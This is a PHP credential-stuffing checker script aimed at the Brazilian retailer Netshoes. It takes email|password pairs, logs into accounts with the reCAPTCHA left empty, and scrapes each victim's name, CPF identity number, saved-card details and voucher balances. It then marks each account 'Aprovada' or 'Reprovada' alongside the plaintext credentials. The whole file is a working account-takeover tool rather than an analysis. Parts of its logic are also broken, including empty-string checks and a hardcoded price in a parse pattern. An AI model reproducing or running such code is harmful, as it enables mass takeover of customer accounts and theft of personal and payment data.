<?php
error_reporting(0);
DeletarCookies();

extract($_GET);

function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

function deletarCookies() {
    if (file_exists("cookie.txt")) {
        unlink("cookie.txt");
    }
}



$lista = str_replace(" ", "", $lista);
$separa = explode("|", $lista);
$email = $separa[0];
$senha = $separa[1];


$ch = curl_init(); 
curl_setopt($ch, CURLOPT_URL, "https://www.netshoes.com.br/login"); 
curl_setopt($ch, CURLOPT_HTTPHEADER, 0); 
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); 
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt'); 
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt'); 
curl_setopt($ch, CURLOPT_POST, 0); 

$data = curl_exec($ch); 
$token = explode('"', explode('id="clipping" type="hidden" value="', $data)[1])[0]; 

curl_setopt($ch, CURLOPT_URL, 'https://www.netshoes.com.br/login'); 
curl_setopt($ch, CURLOPT_POST, 1); 
curl_setopt($ch, CURLOPT_POSTFIELDS, 'username='.$email.'&password='.$senha.'&recaptchaResponse=&clipping='.$token.''); 
$data = curl_exec($ch); 

curl_setopt($ch, CURLOPT_URL, "https://www.netshoes.com.br/account/my-orders"); 
curl_setopt($ch, CURLOPT_POST, 0); 
$data = curl_exec($ch); 

curl_setopt($ch, CURLOPT_URL, "https://www.netshoes.com.br/account/my-personal-info"); 
curl_setopt($ch, CURLOPT_POST, 0); $data = curl_exec($ch); 
$name = explode('" placeholder="* Seu nome"', explode('Nome" type="text" id="name" name="person[name]" value="', $data)[1])[0]; 
$sobrenome = explode('" placeholder="* Sobrenome"', explode('title="Sobrenome" type="text" id="last-name" name="person[lastName]" value="', $data)[1])[0]; 
$cpf = explode('" disabled readonly />', explode('id="cpf" data-hj-masked class="ns-mask-cpf" type="text" name="person[cpf]" value="', $data)[1])[0]; 

curl_setopt($ch, 
CURLOPT_URL, "https://www.netshoes.com.br/account/my-cards"); 
curl_setopt($ch, CURLOPT_POST, 0);
$data = curl_exec($ch); 

if (strpos($data, "Você não possui cartões salvos.")) { 
	$cards = "neClick: <span class='label label-danger'>Não</span>"; 

}else if (strpos($data, "") !== false){ 
	$cards = ""; 

}else if (strpos($data, "Excluir") !== false){ 
	$cards = "OneClick: ";

}else { $cards = "";

} 

$card = explode('</div>', explode('<div class="card-list__info-card">', $data)[1])[0]; 
curl_setopt($ch, CURLOPT_URL, "https://www.netshoes.com.br/account/my-cards"); 
curl_setopt($ch, CURLOPT_POST, 0); 
$data = curl_exec($ch); 

if (strpos($data, "Você não possui cartões salvos.")) { 
	$datacard = ""; 

} else if (strpos($data, "") !== false){ 
	$datacard = ""; 

} else if (strpos($data, "Validade") !== false){ 
	$datacard = " | Data Vale: ";

} else { $datacard = ""; 

} 

$cardviado = explode('</div>', explode('<div class="card-list__info-date">', $data)[1])[0];
curl_setopt($ch, CURLOPT_URL, "https://www.netshoes.com.br/account/my-vouchers"); 
curl_setopt($ch, CURLOPT_POST, 0); $data2 = curl_exec($ch); 

if (strpos($data2, "Você não possui vales-compra.")) { 
	$vale = " [Vale] Não"; 

} else if (strpos($data2, "Aguardando ativação") !== false){ 
	$vale = " [Vale] Aguardando ativação [Saldo]"; 

} else if (strpos($data2, "Ativo") !== false){ 
	$vale = " [Vale] Ativo [Saldo] ";

} else { 
	$vale = " [Vale] Não"; 
} 

$saldos = explode('</i>', explode('</i></td><td class="cell green-text"><i>', $data2)[1])[0]; 
$saldo = explode('</i></td><td class="cell">', explode('<td class="cell red-text"><i>R$ 104,90</i></td><td class="cell green-text"><i>', $data2)[1])[0]; 

if (strpos($data2, "Você não possui vales-compra.")) { 
$validade = ""; 

} else if (strpos($data2, "Aguardando ativação") !== false){ $validade = ""; 

} else if (strpos($data2, "Ativo") !== false){ 
$validade = " [Data Vale]"; 

} else { $validade = ""; 

} 

$validad = explode('</td><td class="cell">', explode('</i></td><td class="cell">', $data2)[1])[0]; 

if (!strpos($data, "Meus Pedidos")) { 
	echo '<i style="color: red; text-shadow: 0 0 10px red;" class="fa fa-circle"></i> <font color=red>Reprovada &#10008;</font> '.$email.' | '.$senha.'<br>';
} else { 
    $tudo = " [Nome] $name $sobrenome [Cpf] $cpf $vale $saldos $validade $validad ";
	echo '<i style="color: lime; text-shadow: 0 0 10px lime;" class="fa fa-circle"></i> <font color=lime>Aprovada &#10004;</font> '.$email.' | '.$senha.''.$tudo.'<font color=green></font><br>';

	}

?>